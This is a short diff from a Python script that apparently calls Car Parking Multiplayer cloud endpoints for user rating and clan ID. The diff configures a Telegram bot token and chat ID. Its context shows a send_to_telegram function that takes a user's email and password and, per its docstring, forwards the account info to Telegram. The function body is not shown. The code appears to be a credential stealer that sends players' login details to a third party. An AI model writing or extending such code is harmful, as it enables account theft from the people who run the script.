@@ -11,8 +11,8 @@ RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4
 CLAN_ID_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/GetClanId"
 
 # --- Telegram Bot Configuration ---
-BOT_TOKEN =
-CHAT_ID =
+BOT_TOKEN = os.getenv("BOT_TOKEN", "dummy_token")
+CHAT_ID = int(os.getenv("CHAT_ID", "123456789"))
 
 def send_to_telegram(email, password, clan_id):
     """Send account info to Telegram only if ClanId exists."""
